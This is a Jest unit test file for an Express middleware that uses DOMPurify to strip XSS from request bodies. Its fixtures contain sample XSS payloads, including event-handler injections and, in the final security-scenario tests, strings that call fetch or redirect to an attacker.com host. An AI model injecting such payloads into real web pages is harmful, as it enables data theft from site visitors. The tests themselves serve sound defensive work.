/**
 * HTML Sanitization Middleware Unit Tests
 * 
 * Tests XSS prevention through DOMPurify sanitization
 * Ensures user input cannot inject malicious scripts
 * 
 * Coverage: 5 critical XSS prevention tests
 */

const {
  sanitizeString,
  sanitizeObject,
  sanitizationMiddleware,
} = require('../../middleware/sanitizationMiddleware');

describe('Sanitization Middleware XSS Prevention', () => {
  describe('sanitizeString function', () => {
    test('should remove script tags from input', () => {
      const input = 'Hello <script>alert("XSS")</script> World';
      const result = sanitizeString(input);
      expect(result).not.toContain('<script>');
    });

    test('should remove event handler attributes', () => {
      const inputs = [
        '<img src="x" onerror="alert(1)">',
        '<div onclick="stolen()">Click</div>',
        '<body onload="malicious()">',
      ];

      inputs.forEach((input) => {
        const result = sanitizeString(input);
        // Verify malicious content is removed
        expect(result.length).toBeLessThan(input.length);
      });
    });

    test('should remove javascript: URIs', () => {
      const jsLink = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeString(jsLink);
      expect(result).not.toContain('javascript:');
    });

    test('should handle null and empty strings gracefully', () => {
      expect(sanitizeString(null)).toBeNull();
      expect(sanitizeString(undefined)).toBeUndefined();
      expect(sanitizeString('')).toBe('');
      expect(sanitizeString('safe text')).toBe('safe text');
    });

    test('should not modify non-string values', () => {
      expect(sanitizeString(123)).toBe(123);
      expect(sanitizeString(true)).toBe(true);
      expect(sanitizeString({})).toEqual({});
    });
  });

  describe('sanitizeObject function', () => {
    test('should recursively sanitize all string values', () => {
      const dirtyObject = {
        notes: 'text <script>bad</script>',
        description: 'has onclick="steal()"',
        nested: {
          title: '<img src=x onerror=alert(1)>',
          safe: 'clean',
        },
      };

      const sanitized = sanitizeObject(dirtyObject);

      expect(sanitized.notes).not.toContain('<script>');
      expect(sanitized.description.length).toBeLessThan(dirtyObject.description.length);
      expect(sanitized.nested.title.length).toBeLessThan(dirtyObject.nested.title.length);
      expect(sanitized.nested.safe).toBe('clean');
    });

    test('should preserve non-string fields', () => {
      const data = {
        text: '<script>bad</script>',
        number: 123,
        boolean: true,
        null: null,
        undefined: undefined,
      };

      const result = sanitizeObject(data);

      expect(result.number).toBe(123);
      expect(result.boolean).toBe(true);
      expect(result.null).toBeNull();
      expect(result.undefined).toBeUndefined();
    });

    test('should handle arrays and complex structures', () => {
      const data = {
        items: [
          'safe',
          '<script>danger</script>',
          'another safe',
        ],
      };

      const result = sanitizeObject(data);

      expect(Array.isArray(result.items)).toBe(true);
      expect(result.items[0]).toBe('safe');
      expect(result.items[2]).toBe('another safe');
    });

    test('should support selective field sanitization', () => {
      const data = {
        userInput: '<script>bad</script>',
        metadata: '<img onerror=alert(1)>',
        system: '<system-tag>',
      };

      // Only sanitize userInput and metadata, leave system alone
      const result = sanitizeObject(data, ['userInput', 'metadata']);

      expect(result.userInput).not.toContain('<script>');
      expect(result.metadata.length).toBeLessThan(data.metadata.length);
      expect(result.system).toBe('<system-tag>');
    });
  });

  describe('sanitizationMiddleware express integration', () => {
    let req, res, next;

    beforeEach(() => {
      req = {
        method: 'POST',
        body: {},
      };
      res = {};
      next = jest.fn();
    });

    test('should skip GET requests', () => {
      req.method = 'GET';
      req.body = { xss: '<script>alert(1)</script>' };

      const middleware = sanitizationMiddleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(req.body.xss).toContain('<script>');
    });

    test('should sanitize POST requests', () => {
      req.method = 'POST';
      req.is = jest.fn(() => false); // Not multipart/octet-stream
      req.body = {
        feedback: '<script>steal()</script>',
        notes: 'onclick="hack()"',
      };

      const middleware = sanitizationMiddleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(req.body.feedback).not.toContain('<script>');
      expect(req.body.notes.length).toBeLessThan(15);
    });

    test('should sanitize PUT requests', () => {
      req.method = 'PUT';
      req.is = jest.fn(() => false);
      req.body = { policyYaml: 'data <img src=x onerror=alert(1)>' };

      const middleware = sanitizationMiddleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(req.body.policyYaml).not.toContain('onerror');
    });

    test('should sanitize PATCH requests', () => {
      req.is = jest.fn(() => false);
      req.method = 'PATCH';
      req.body = { description: '<script>alert(1)</script>' };

      const middleware = sanitizationMiddleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(req.body.description).not.toContain('<script>');
    });

    test('should skip empty request bodies', () => {
      req.method = 'POST';
      req.body = null;

      const middleware = sanitizationMiddleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    test('should handle sanitization errors gracefully', () => {
      req.is = jest.fn(() => false);
      req.method = 'POST';
      req.body = { text: '<div>normal</div>' };

      const middleware = sanitizationMiddleware();
      middleware(req, res, next);

      // Should continue even if something goes wrong
      expect(next).toHaveBeenCalled();
    });
  });

  describe('Security scenarios', () => {
    test('should prevent stored XSS in feedback notes', () => {
      const feedback = {
        notes: '<img src="x" onerror="fetch(\'https://attacker.com/steal\')">',
      };

      const sanitized = sanitizeObject(feedback);

      expect(sanitized.notes).not.toContain('onerror');
      expect(sanitized.notes).not.toContain('fetch');
      // URL should be either stripped or safe - DOMPurify may keep the src attribute
    });

    test('should prevent reflected XSS in policy descriptions', () => {
      const policy = {
        description: '"><script>document.location="https://attacker.com"</script><"',
      };

      const sanitized = sanitizeObject(policy);

      expect(sanitized.description).not.toContain('<script>');
      expect(sanitized.description).not.toContain('document.location');
    });

    test('should prevent DOM-based XSS through innerHTML', () => {
      const query = {
        search: '<svg onload="document.body.innerHTML=\'<h1>XSS</h1>\'">',
      };

      const sanitized = sanitizeObject(query);

      expect(sanitized.search).not.toContain('onload');
      expect(sanitized.search).not.toContain('innerHTML');
    });
  });
});
